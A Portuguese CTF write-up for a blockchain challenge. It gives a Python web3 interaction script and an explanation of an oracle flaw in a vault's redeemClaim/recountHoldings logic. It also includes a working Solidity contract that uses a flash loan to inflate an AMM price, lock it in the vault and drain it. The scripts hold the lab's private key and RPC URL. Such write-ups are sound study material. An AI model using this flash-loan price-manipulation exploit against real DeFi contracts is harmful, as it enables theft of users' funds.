## Resolvido por Doz


**Reconhecimento**
**interact.py**

```python
from web3 import Web3
import os
import json
import time

# Defina os parâmetros do CTF
RPC_URL = "http://154.57.164.78:31822/api/714fc0af-9593-472a-9df1-857dae41bfc0"
PRIVATE_KEY = "dd84ed49a361995ff667a16078c017b55eda732179dfe58347c09eb97bbfaef8"
SETUP_ADDRESS = "0x7CAD511cd045bD47195e9c505e6776dE83ea4796"
WALLET_ADDRESS = "0x4cB068eE50A396c152685411284C2e0f51cf62ac"

# Endereço do contrato Exploit após deploy
EXPLOIT_ADDRESS = "0x0D64cf50C474E0D957E6898f42ecc68841643fC8" 

w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("Falha ao se conectar à RPC URL do Docker!")
    exit(1)

account = w3.eth.account.from_key(PRIVATE_KEY)
print(f"Conectado com sucesso! Carteira: {account.address}")
print(f"Bloco atual: {w3.eth.block_number}")

# ABIs necessárias
abi_setup = [
    {"inputs": [], "name": "crownCoin", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "saltGoods", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "quayMarket", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "goldhandCredit", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "sharehouse", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "buildPublicRecountOrder", "outputs": [{"type": "bytes"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "travelPurseTaken", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "takeTravelPurse", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
]

abi_erc20 = [
    {"inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "transfer", "outputs": [{"type": "bool"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"}
]

abi_sharehouse = [
    {"inputs": [{"name": "crownCoinAmount", "type": "uint256"}], "name": "leaveGoods", "outputs": [{"type": "uint256"}], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "claimMarkAmount", "type": "uint256"}], "name": "redeemClaim", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "account", "type": "address"}], "name": "claimMarks", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "recordedHoldings", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"}
]

setup_contract = w3.eth.contract(address=SETUP_ADDRESS, abi=abi_setup)

# 1. Obter endereços dos contratos do Setup
print("\n=== Consultando endereços dos contratos ===")
crown_address = setup_contract.functions.crownCoin().call()
salt_address = setup_contract.functions.saltGoods().call()
market_address = setup_contract.functions.quayMarket().call()
credit_address = setup_contract.functions.goldhandCredit().call()
sharehouse_address = setup_contract.functions.sharehouse().call()
stamped_order = setup_contract.functions.buildPublicRecountOrder().call()

print(f"CROWN Token:   {crown_address}")
print(f"SALT Token:    {salt_address}")
print(f"Quay Market:   {market_address}")
print(f"Goldhand:      {credit_address}")
print(f"Sharehouse:    {sharehouse_address}")

crown_contract = w3.eth.contract(address=crown_address, abi=abi_erc20)
sharehouse_contract = w3.eth.contract(address=sharehouse_address, abi=abi_sharehouse)

# Mostrar status inicial da nossa carteira
print("\n=== Status da Carteira ===")
my_crown = crown_contract.functions.balanceOf(account.address).call()
my_claims = sharehouse_contract.functions.claimMarks(account.address).call()
print(f"Saldo CROWN:        {my_crown / 1e6} CROWN")
print(f"Participações:     {my_claims / 1e18} ether de claimMarks")
print(f"Recorded Holdings: {sharehouse_contract.functions.recordedHoldings().call() / 1e6} CROWN")
print(f"Sharehouse CROWN:  {crown_contract.functions.balanceOf(sharehouse_address).call() / 1e6} CROWN")
print(f"Desafio Resolvido? {setup_contract.functions.isSolved().call()}")

def send_tx(contract_func, *args, gas_limit=300000):
    tx = contract_func(*args).build_transaction({
        'from': account.address,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': gas_limit,
        'gasPrice': w3.eth.gas_price
    })
    signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"Transação enviada: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print("Confirmada no bloco:", receipt.blockNumber)
    if receipt.status == 0:
        raise Exception(f"Transação falhou no bloco {receipt.blockNumber}! Status: {receipt.status}")
    return receipt

# Executar takeTravelPurse se não tiver sido feito ainda neste setup
purse_taken = setup_contract.functions.travelPurseTaken().call()
if not purse_taken and my_crown == 0 and my_claims == 0:
    print("\n=== Resgatando Bolsa de Viagem (takeTravelPurse) ===")
    send_tx(setup_contract.functions.takeTravelPurse)
    # Atualizar balanço local de CROWN
    my_crown = crown_contract.functions.balanceOf(account.address).call()
    print(f"Saldo CROWN atualizado: {my_crown / 1e6} CROWN")

# Executar depósito inicial se não tiver participações
if my_claims == 0 and my_crown >= 10000e6:
    print("\n=== Passo 1: Depositando 10.000 CROWN na Sharehouse ===")
    print("Aprovando CROWN para a Sharehouse...")
    send_tx(crown_contract.functions.approve, sharehouse_address, int(10000e6))
    
    print("Chamando leaveGoods...")
    send_tx(sharehouse_contract.functions.leaveGoods, int(10000e6))
    
    my_claims = sharehouse_contract.functions.claimMarks(account.address).call()
    print(f"Novas participações obtidas: {my_claims / 1e18} ether de claimMarks")

# Se o Exploit já estiver implantado, rodar os passos finais
if EXPLOIT_ADDRESS:
    exploit_abi = [
        {"inputs": [{"name": "amount", "type": "uint256"}], "name": "run", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
    ]
    exploit_contract = w3.eth.contract(address=EXPLOIT_ADDRESS, abi=exploit_abi)
    
    # Se o saldo de CROWN na carteira for 0, precisamos da Fase A para obter CROWN de saldo
    if my_crown == 0:
        print("\n=== [Fase A] Resgatando saldo de CROWN para cobrir arredondamentos ===")
        print("Executando flash loan preliminar com 79M CROWN (divisão perfeita, sem perdas)...")
        send_tx(exploit_contract.functions.run, int(79000000e6), gas_limit=1000000)
        
        print("Resgatando 10 ether de claimMarks para obter saldo de CROWN...")
        send_tx(sharehouse_contract.functions.redeemClaim, int(10 * 1e18))
        
        # Atualizar saldo local
        my_crown = crown_contract.functions.balanceOf(account.address).call()
        my_claims = sharehouse_contract.functions.claimMarks(account.address).call()
        print(f"Saldo CROWN obtido: {my_crown / 1e6} CROWN")
        print(f"Participações restantes: {my_claims / 1e18} ether de claimMarks")
        
    print("\n=== [Fase B] Executando o Exploit Final com 90M CROWN ===")
    
    # Enviar 1 CROWN para o Exploit para cobrir o arredondamento na AMM
    exploit_crown = crown_contract.functions.balanceOf(EXPLOIT_ADDRESS).call()
    if exploit_crown < int(1e6):
        print("Enviando 1 CROWN para o contrato Exploit para cobrir arredondamento...")
        send_tx(crown_contract.functions.transfer, EXPLOIT_ADDRESS, int(1e6))
        
    print("Executando flash loan principal de 90M CROWN...")
    send_tx(exploit_contract.functions.run, int(90000000e6), gas_limit=1000000)
    
    # Aguardar 2 segundos para o recount ser processado
    print("\n=== Aguardando processamento do recount... ===")
    time.sleep(2)
    
    # Obter as participações INFLADAS após o recount
    inflated_claims = sharehouse_contract.functions.claimMarks(account.address).call()
    print(f"Participações INFLADAS: {inflated_claims / 1e18} ether de claimMarks")
    
    print("\n=== Passo 3: Resgatando todas as participações infladas (Redeem) ===")
    # Resgatar TODAS as participações infladas
    send_tx(sharehouse_contract.functions.redeemClaim, inflated_claims, gas_limit=1000000)
    
    print("\n=== Verificando Status Final ===")
    final_crown = crown_contract.functions.balanceOf(account.address).call()
    print(f"Meu saldo CROWN final: {final_crown / 1e6} CROWN")
    print(f"Sharehouse CROWN final: {crown_contract.functions.balanceOf(sharehouse_address).call() / 1e6} CROWN")
    print(f"Desafio Resolvido? {setup_contract.functions.isSolved().call()}")
else:
    print("\n[!] Insira o endereço do contrato Exploit na variável EXPLOIT_ADDRESS para rodar o ataque final.")
    print("\n=== Comando Gerado para Fazer Deploy do Exploit com Forge ===")
    print("Execute os comandos abaixo para instalar o Foundry (se necessário), compilar e fazer o deploy do contrato Exploit:")
    print("1. Instalar o Foundry (pule se já tiver instalado):")
    print("   curl -L https://foundry.paradigm.xyz | bash && source ~/.bashrc && foundryup")
    print("\n2. Execute o deploy:")
    print("   forge create Exploit.sol:Exploit \\")
    print(f"     --rpc-url \"{RPC_URL}\" \\")
    print(f"     --private-key \"{PRIVATE_KEY}\" \\")
    print("     --broadcast \\")
    print("     --constructor-args \\")
    print(f"       {credit_address} \\")
    print(f"       {market_address} \\")
    print(f"       {sharehouse_address} \\")
    print(f"       {crown_address} \\")
    print(f"       {salt_address} \\")
    print(f"       0x{stamped_order.hex()}")
```

```bash
# Consultando os contratos do setup e obtendo os endereços iniciais
python3 interact.py
```

## Endereços obtidos no Docker/Anvil:
- CROWN Token: `0xe41c8322456E1a13D03A644821eCdBC1eb6abB2d`
- SALT Token: `0x6596086ec3DeBb1e7b0BcB5B38bed61CDCA50ec5`
- Quay Market (AMM): `0x846ffdf692951b210132B67C112772C90Ba12188`
- Goldhand Credit (Flash Loan): `0xAd7b720288A78af093c8547ab852194f558b5b27`
- Sharehouse (Cofre): `0x4c35f771d445810d5946a8BC250D9Bd945275f3e`

---

**Vulnerabilidade**

A falha reside na função `redeemClaim` do contrato `DocksideSharehouse.sol`, que calcula o valor de saque dos tokens `CROWN` de forma dinâmica baseando-se no saldo registrado em `recordedHoldings`:

```solidity
function redeemClaim(uint256 claimMarkAmount) external {
    require(claimMarkAmount > 0, "ZERO_CLAIM");
    require(claimMarks[msg.sender] >= claimMarkAmount, "NOT_ENOUGH_CLAIMS");

    uint256 crownCoinAmount = (claimMarkAmount * recordedHoldings) / totalClaimMarks;

    claimMarks[msg.sender] -= claimMarkAmount;
    totalClaimMarks -= claimMarkAmount;

    require(crownCoin.transfer(msg.sender, crownCoinAmount), "PAYOUT_FAILED");
    emit ClaimRedeemed(msg.sender, claimMarkAmount, crownCoinAmount);
}
```

A variável `recordedHoldings` pode ser recalculada publicamente através da função `recountHoldings`, que por sua vez obtém o preço atualizado da reserva de `CROWN` diretamente na AMM `Quay Market`:

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);
    uint256 newHoldings = abi.decode(result, (uint256));
    emit HoldingsRecounted(recordedHoldings, newHoldings);
    recordedHoldings = newHoldings;
}
```

Diferente do depósito (`leaveGoods`), a função `redeemClaim` não impede saques enquanto um flash loan do `GoldhandCredit` estiver ativo. Isso possibilita que:
1. Um atacante tome um flash loan gigantesco de CROWN e envie para a AMM trocando por SALT, elevando a reserva de CROWN para o topo.
2. Invoque `recountHoldings` durante o empréstimo, travando a cotação inflada no estado da Sharehouse.
3. Desfaça a troca de CROWN/SALT e devolva o empréstimo para o `GoldhandCredit`.
4. Em seguida, saque as cotas utilizando a cotação inflada travada na Sharehouse, drenando os fundos.

---

**Exploit.sol**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDocksideMarket {
    function trade(int128 fromGood, int128 toGood, uint256 amountIn, uint256 minimumOut) external returns (uint256);
}

interface IDocksideSharehouse {
    function recountHoldings(bytes calldata stampedOrder) external;
}

interface IGoldhandCredit {
    function borrowForOneCall(uint256 amount, bytes calldata data) external;
}

contract Exploit {
    IGoldhandCredit public immutable goldhandCredit;
    IDocksideMarket public immutable quayMarket;
    IDocksideSharehouse public immutable sharehouse;
    IERC20 public immutable crownCoin;
    IERC20 public immutable saltGoods;
    bytes public stampedOrder;

    constructor(
        address _goldhandCredit,
        address _quayMarket,
        address _sharehouse,
        address _crownCoin,
        address _saltGoods,
        bytes memory _stampedOrder
    ) {
        goldhandCredit = IGoldhandCredit(_goldhandCredit);
        quayMarket = IDocksideMarket(_quayMarket);
        sharehouse = IDocksideSharehouse(_sharehouse);
        crownCoin = IERC20(_crownCoin);
        saltGoods = IERC20(_saltGoods);
        stampedOrder = _stampedOrder;
    }

    function run(uint256 amount) external {
        goldhandCredit.borrowForOneCall(amount, "");
    }

    function onQuayLoan(uint256 amount, bytes calldata /* data */) external {
        // 1. Troca CROWN -> SALT (AMM Constant Product: x * y = k)
        crownCoin.approve(address(quayMarket), amount);
        uint256 saltObtained = quayMarket.trade(0, 1, amount, 0);

        // 2. Atualiza a cotação (Recount)
        sharehouse.recountHoldings(stampedOrder);

        // 3. Troca SALT -> CROWN de volta (recuperar quase todo o empréstimo)
        saltGoods.approve(address(quayMarket), saltObtained);
        quayMarket.trade(1, 0, saltObtained, 0);

        // 4. Devolve o empréstimo perfeitamente sem sobras ou faltas
        crownCoin.transfer(msg.sender, amount);
    }
}
```

---

